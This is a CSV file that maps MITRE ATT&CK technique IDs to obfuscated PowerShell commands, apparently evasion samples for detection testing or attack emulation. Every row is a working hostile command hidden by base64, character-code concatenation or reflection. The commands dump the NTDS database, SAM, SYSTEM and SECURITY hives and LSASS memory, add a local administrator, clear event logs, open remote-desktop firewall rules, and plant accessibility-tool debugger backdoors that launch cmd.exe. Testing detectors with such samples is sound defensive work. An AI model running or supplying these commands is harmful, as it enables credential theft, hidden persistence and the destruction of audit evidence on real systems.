id,command
T1003,powershell -e cG93ZXJzaGVsbCBudGRzdXRpbC5leGUgJ2FjIGkgbnRkcycgJ2lmbScgJ2NyZWF0ZSBmdWxsIGM6XHVzZXJzXHB1YmxpYycgcSBx
T1078,"powershell -c ""$cmd = [char]67+[char]58+[char]92+[char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115+[char]92+[char]115+[char]121+[char]115+[char]116+[char]101+[char]109+[char]51+[char]50+[char]92+[char]110+[char]101+[char]116+[char]32+[char]108+[char]111+[char]99+[char]97+[char]108+[char]103+[char]114+[char]111+[char]117+[char]112+[char]32+[char]97+[char]100+[char]109+[char]105+[char]110+[char]105+[char]115+[char]116+[char]114+[char]97+[char]116+[char]111+[char]114+[char]115+[char]32+[char]122+[char]32+[char]47+[char]97+[char]100+[char]100; iex $cmd"""
T1003,"powershell -c ""[System.Management.Automation.ScriptBlock]::Create('reg save hklm\system system').Invoke()"""
T1003,"powershell -c ""Start-Process 'reg' -ArgumentList 'save hklm\sam sam'"""
T1003,"powershell -c ""$cmd = [char]114+[char]101+[char]103+[char]32+[char]115+[char]97+[char]118+[char]101+[char]32+[char]72+[char]75+[char]76+[char]77+[char]92+[char]115+[char]101+[char]99+[char]117+[char]114+[char]105+[char]116+[char]121+[char]32+[char]115+[char]101+[char]99; iex $cmd"""
T1003,"$method = [System.Management.Automation.PSObject].Assembly.GetType(""System.Management.Automation.CommandDiscovery"").GetMethod(""GetCommand"", ""NonPublic, Static""); $cmd = $method.Invoke($null, @(""rundll32.exe"", [System.Management.Automation.CommandTypes]::Application)); & $cmd.Definition C:\windows\System32\comsvcs.dll, MiniDump [LSASS_PID] C:\windows\temp\lsass.dmp full"
T1070,powershell -e d2V2dHV0aWwuZXhlIGNsIFtMT0dOQU1FXQ==
T1070,"powershell -c ""$cmd = [char]119+[char]101+[char]118+[char]116+[char]117+[char]116+[char]105+[char]108+[char]46+[char]101+[char]120+[char]101+[char]32+[char]101+[char]108; iex $cmd"""
T1562,powershell -e bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9cmVtb3RlIGRlc2t0b3AgbmV3IGVuYWJsZT1ZZXM=
T1546,"powershell -c ""[System.Management.Automation.ScriptBlock]::Create('HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f').Invoke()"""
T1546,powershell -e SEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxJbWFnZSBGaWxlIEV4ZWN1dGlvbiBPcHRpb25zXHNldGhjLmV4ZSAvdiBEZWJ1Z2dlciAvdCBSRUdfU1ogL2QgQzpcd2luZG93c1xzeXN0ZW0zMlxjbWQuZXhlIC9m
